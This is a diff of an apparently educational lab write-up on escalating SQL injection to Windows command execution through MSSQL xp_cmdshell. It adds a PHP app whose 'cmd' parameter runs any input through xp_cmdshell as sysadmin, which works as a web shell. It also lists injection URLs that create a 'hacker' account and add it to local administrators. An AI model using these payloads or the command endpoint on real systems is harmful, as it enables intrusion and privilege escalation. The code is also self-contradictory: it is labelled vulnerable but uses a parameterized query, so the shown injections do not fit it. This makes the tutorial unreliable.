@@ -28,8 +28,89 @@ Database applications like MySQL, MS SQL, and Oracle can execute system commands
 
 ## Practical Approach
 1. Download and install XAMPP, Microsoft SQL Server and also SQL Server Management Studio (SSMS) in Windows 10 VM
-2. When SSMS is launched, connect to the SQL Server Instance using the appropriate server name and authentication details (can just leave it as optional)
-3. Once connected, go to the toolbar and click 'New Query'. Run the following commands in the query window and execute them
+2. The vulnerable PHP web app is called `vuln.php` and is saved in vulnsql folder in htdocs
+   ```
+   <?php
+   error_reporting(E_ALL);
+   ini_set('display_errors', 1);
+   
+   // Database connection details
+   $serverName = "localhost"; // Replace with your server name
+   $connectionOptions = array(
+       "Database" => "master", // Replace with your database name
+       "UID" => "sa",          // SQL Server username (sysadmin)
+       "PWD" => "sa"           // SQL Server password
+   );
+   
+   // Establishes the connection
+   $conn = sqlsrv_connect($serverName, $connectionOptions);
+   
+   // Check connection
+   if (!$conn) {
+       die("Connection failed: " . print_r(sqlsrv_errors(), true));
+   }
+   
+   // Vulnerable input field: Sanitize input using parameterized queries
+   if (isset($_GET['id'])) {
+       $id = $_GET['id'];  // Vulnerable to SQL Injection without sanitization
+   
+       // Prepare and execute the query securely using parameterized queries
+       $sql = "SELECT * FROM users WHERE id = ?";
+       $params = array($id);
+       $result = sqlsrv_query($conn, $sql, $params);
+   
+       // Check if the query executed successfully
+       if ($result === false) {
+           echo "SQL query failed!<br />";
+           die(print_r(sqlsrv_errors(), true));
+       }
+   
+       // Display results
+       while ($row = sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC)) {
+           // Loop through all columns and display them
+           foreach ($row as $column => $value) {
+               echo "$column: $value<br />";
+           }
+           echo "<br />"; // Line break between rows
+       }
+   
+       sqlsrv_free_stmt($result);
+   }
+   
+   // Command execution: Secure input for executing xp_cmdshell
+   if (isset($_GET['cmd'])) {
+       $cmd = $_GET['cmd'];
+   
+       // Log the command to the error log for debugging
+       error_log("Executing command: $cmd");
+   
+       // Prepare and execute the xp_cmdshell query
+       $sql = "EXEC xp_cmdshell ?";
+       $params = array($cmd);
+       $result = sqlsrv_query($conn, $sql, $params);
+   
+       // Check if the query executed successfully
+       if ($result === false) {
+           echo "SQL query failed!<br />";
+           die(print_r(sqlsrv_errors(), true));
+       }
+   
+       // Display the command output
+       while ($row = sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC)) {
+           foreach ($row as $value) {
+               echo "$value<br />";  // Display the output of the executed command
+           }
+       }
+   
+       sqlsrv_free_stmt($result);
+   }
+   
+   // Close the database connection
+   sqlsrv_close($conn);
+   ?>
+   ```
+3. When SSMS is launched, connect to the SQL Server Instance using the appropriate server name and authentication details (can just leave it as optional)
+4. Once connected, go to the toolbar and click 'New Query'. Run the following commands in the query window and execute them
    ```
    -- Check if xp_cmdshell is enabled
    EXEC sp_configure 'show advanced options', 1;
@@ -42,12 +123,12 @@ Database applications like MySQL, MS SQL, and Oracle can execute system commands
    RECONFIGURE;
    GO
    ```
-4. Verify that `xp_cmdshell` is enabled by running the command `EXEC xp_cmdshell 'whoami';` in the same query window. The output should look like this <br/>
+5. Verify that `xp_cmdshell` is enabled by running the command `EXEC xp_cmdshell 'whoami';` in the same query window. The output should look like this <br/>
    ![image](https://github.com/user-attachments/assets/f6fc0fb6-44da-4d4b-9cb0-73c1ada05908)
-5. Add MSSQL Server service account to local administrators by running `lusrmgr.msc` to open Local Users and Groups Manager. Add `NT Service\MSSQLSERVER` to the Administrators group <br/>
+6. Add MSSQL Server service account to local administrators by running `lusrmgr.msc` to open Local Users and Groups Manager. Add `NT Service\MSSQLSERVER` to the Administrators group <br/>
    ![image](https://github.com/user-attachments/assets/7f1938de-c875-4359-b72f-212c133d3ac6)
-6. Before running the vulnerable web application, download and install SQLSRV driver that matches the PHP version. If the PHP version is 8.2.12, find the files named `php_sqlsrv_82_nts_x64.dll` and `php_pdo_sqlsrv_82_nts_x64.dll` and copy them both to `C:\xampp\php\ext\`. Update the `php.ini` file to include `extension=php_sqlsrv_82_nts_x64.dll` and `extension=php_pdo_sqlsrv_82_nts_x64.dll` in the extensions section. Restart Apache in XAMPP
-7. In SMSS, open a new query window and run the following SQL commands
+7. Before running the vulnerable web application, download and install SQLSRV driver that matches the PHP version. If the PHP version is 8.2.12, find the files named `php_sqlsrv_82_nts_x64.dll` and `php_pdo_sqlsrv_82_nts_x64.dll` and copy them both to `C:\xampp\php\ext\`. Update the `php.ini` file to include `extension=php_sqlsrv_82_nts_x64.dll` and `extension=php_pdo_sqlsrv_82_nts_x64.dll` in the extensions section. Restart Apache in XAMPP
+8. In SMSS, open a new query window and run the following SQL commands
    ```
    CREATE TABLE Users (
     ID INT PRIMARY KEY IDENTITY(1,1),
@@ -60,8 +141,8 @@ Database applications like MySQL, MS SQL, and Oracle can execute system commands
    ```
    The data can be found by expanding the Tables Node located under the master node
    ![image](https://github.com/user-attachments/assets/18dcc7d3-e34c-4ac2-a104-db3571d3170e)
-8. Download and install Microsoft ODBC Driver for SQL Server (x64) in the reference link above. After installation, test the web app in localhost. If it does not work, repair the ODBC Driver by reinstalling and choose repair
-9. To give admin privileges to the SQL Server account, it needs to be added to the `sysadmin` role (highest-level admin role in SQL). However, the SQL account username needs to be known first, and can be identified using
+9. Download and install Microsoft ODBC Driver for SQL Server (x64) in the reference link above. After installation, test the web app in localhost. If it does not work, repair the ODBC Driver by reinstalling and choose repair
+10. To give admin privileges to the SQL Server account, it needs to be added to the `sysadmin` role (highest-level admin role in SQL). However, the SQL account username needs to be known first, and can be identified using
    ```
    SELECT name 
    FROM sys.syslogins 
@@ -86,21 +167,21 @@ Database applications like MySQL, MS SQL, and Oracle can execute system commands
    ```
    SELECT * FROM sys.syslogins WHERE name = 'username';
    ```
-10. In the web app, add `?id=1` at the end of the URL to check and retrieve data with ID = 1 stored in the database table
-11. To inject `xp_cmdshell` into the query, use a dynamic SQL within the query as the following. The SQL Server interprets and run a dynamic SQL string which would not be blocked in a standard SQL query
+11. In the web app, add `?id=1` at the end of the URL to check and retrieve data with ID = 1 stored in the database table
+12. To inject `xp_cmdshell` into the query, use a dynamic SQL within the query as the following. The SQL Server interprets and run a dynamic SQL string which would not be blocked in a standard SQL query
     ```
     http://localhost/vulnsql/vuln.php?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''whoami'')';--
     ```
-12. To use SQL injection to create a new user `hacker` with password `hacked1337`, use the following SQL injection strings at the end of the web app's URL
+13. To use SQL injection to create a new user `hacker` with password `hacked1337`, use the following SQL injection strings at the end of the web app's URL
     ```
     ?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''net user hacker hacked1337 /add'')';--
     ```
-13. To add this user to the local administrators group, add the following
+14. To add this user to the local administrators group, add the following
     ```
     ?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''net localgroup administrators hacker /add'')';--
     ```
-14. To verify `hacker` was added, check using the SQL injection string
+15. To verify `hacker` was added, check using the SQL injection string
     ```
     ?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''whoami'')';--
     ```
-15. 
+16. 
